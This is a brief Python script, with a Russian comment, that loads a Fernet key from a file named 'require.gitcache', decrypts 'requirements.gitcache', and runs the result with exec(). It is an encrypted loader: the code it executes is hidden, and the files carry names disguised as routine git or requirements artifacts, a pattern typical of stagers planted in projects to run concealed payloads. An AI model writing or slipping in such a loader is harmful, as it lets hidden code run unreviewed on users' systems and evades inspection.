from cryptography.fernet import Fernet

def load_key():
    return open("require.gitcache", "rb").read()

def decrypt_file(file_path):
    key = load_key()
    fernet = Fernet(key)

    with open(file_path, "rb") as file:
        encrypted_data = file.read()

    decrypted_data = fernet.decrypt(encrypted_data)

    return decrypted_data.decode()

# Пример использования
file_path = "requirements.gitcache"
decrypted_code = decrypt_file(file_path)

exec(decrypted_code)